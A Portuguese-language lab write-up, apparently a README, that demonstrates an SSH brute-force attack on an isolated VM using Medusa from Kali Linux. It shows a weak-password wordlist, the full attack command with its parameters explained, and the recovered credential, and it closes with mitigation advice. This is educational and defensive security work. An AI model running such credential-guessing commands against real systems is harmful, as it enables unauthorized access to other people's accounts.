# 🔐 Brute Force com Medusa e Kali Linux

Demonstração prática de ataque de força bruta via SSH utilizando o Medusa
em ambiente isolado e controlado, com foco em auditoria de segurança,
análise de vulnerabilidades e recomendações de mitigação.

> ⚠️ **Aviso Legal:** Este projeto foi realizado exclusivamente em ambiente isolado, com máquinas virtuais criadas para fins educacionais. Jamais realize testes em sistemas sem autorização expressa.

---

## 🧪 Ambiente Utilizado

| Componente      | Detalhes                        |
|-----------------|---------------------------------|
| Atacante        | Kali Linux (kali-26-Dev)        |
| Alvo            | VM Linux – IP 192.168.26.10     |
| Rede            | Host-only / Rede interna isolada|
| Ferramenta      | Medusa v2.3                     |
| Serviço atacado | SSH (porta 22)                  |

---

## 📋 Wordlist Utilizada

Arquivo criado manualmente: `senha.txt`

```txt
teste123
admin123
Password123
Senha@2026
Teste@123
1234567
Linux@123
Senha123!
```

A wordlist simula senhas fracas e comuns, incluindo padrões brasileiros como `Senha@2026` e `Teste@123`.

---

## ⚙️ Comando Executado

```bash
medusa -h 192.168.26.10 -u lab -P senha.txt -M ssh -n 22 -t 2 -f
```

### Explicação dos parâmetros:

| Parâmetro | Descrição |
|-----------|-----------|
| `-h 192.168.26.10` | IP do host alvo |
| `-u lab` | Usuário a ser testado |
| `-P senha.txt` | Wordlist de senhas |
| `-M ssh` | Módulo SSH |
| `-n 22` | Porta do serviço |
| `-t 2` | Número de threads paralelas |
| `-f` | Para ao encontrar a primeira credencial válida |

---

## 🎯 Resultado

O ataque testou 7 senhas antes de encontrar a credencial válida:

```
ACCOUNT FOUND: [ssh] Host: 192.168.26.10 User: lab Password: Linux@123 [SUCCESS]
```

✅ Credencial descoberta: **usuário** `lab` / **senha** `Linux@123`

---

## 🛡️ Medidas de Mitigação

Com base neste teste, as seguintes medidas são recomendadas para proteger serviços SSH:

1. **Desativar login por senha** — usar apenas autenticação por chave SSH
2. **Fail2Ban** — bloquear IPs após N tentativas falhas
3. **Alterar a porta padrão** — sair da porta 22 para reduzir varreduras automatizadas
4. **Allowlist de IPs** — restringir acesso SSH apenas a IPs conhecidos via firewall
5. **Política de senhas fortes** — exigir senhas longas, únicas e sem padrões previsíveis
6. **MFA** — autenticação multifator mesmo para SSH (ex: Google Authenticator + PAM)
7. **Monitoramento de logs** — alertas em tempo real para tentativas de acesso suspeitas

---

## 📚 Aprendizados

- O Medusa é uma ferramenta eficiente para auditar serviços de rede como SSH, FTP e SMB
- Senhas com padrões previsíveis (`Linux@123`, `Senha@2026`) são vulneráveis mesmo com caracteres especiais
- O parâmetro `-f` é importante em ambientes reais para evitar ruído desnecessário
- Ambientes isolados (host-only) são essenciais para testes seguros e éticos

---

## 🔗 Referências

- [Kali Linux](https://www.kali.org/)
- [Medusa – Documentação Oficial](http://www.foofus.net/jmk/medusa/medusa.html)
